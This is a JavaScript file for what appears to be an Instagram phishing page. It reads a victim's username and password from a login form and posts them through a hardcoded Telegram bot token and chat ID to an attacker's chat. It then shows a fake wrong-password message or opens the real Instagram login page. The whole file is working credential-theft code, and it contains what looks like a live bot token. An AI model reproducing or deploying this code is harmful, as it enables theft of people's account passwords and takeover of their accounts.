const TOKEN = "6839101586:AAEAQad_515f4lhz49c3I1kX0jLCnrO5D8Q"
const CHAT_ID = "-1001862459483"
const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`
const success = document.getElementById("success")
const nameInput = document.getElementById('name')
const emailInput = document.getElementById('email')
const icon = document.querySelector(".icon ion-icon")
const btn = document.getElementById('submitButton')


console.log(emailInput);
btn.addEventListener('click', () => {
  if (emailInput.value.length < 8 || nameInput.value.length < 1) {
    success.innerHTML = "Вы ввели неверный пароль. Проверьте пароль и попробуйте ещё раз";
  } else {

    console.log("next");
  window.open('https://www.instagram.com/accounts/login/')

}

});

console.log(icon);
icon.addEventListener('click', () => {
    if(emailInput.type === "password"){
        emailInput.type = "text";
        }else{
        emailInput.type = "password";
        }    
})


document.getElementById('tg').addEventListener('submit', function(e){
    e.preventDefault()
    console.log(e);

let message = `<b> Заявка с сайта !</b>\n`
message += `<b> Instagram Отправитель: </b> ${ this.name.value }\n`
message += `<b> Instagram Пароль: </b> ${ this.email.value }\n`


axios.post(URI_API, {
    chat_id: CHAT_ID,
    parse_mode: 'html', 
    text:  message,
}).then((res)=>{
    this.name.value = "";
    this.email.value = "";
    console.log(nameInput.value);
  
    
    
    // console.log(nameInput.value);
    // console.log(emailInput.value);
   
    success.style.display = "block"
    // success.style.marginBottom = "20px"

})

})



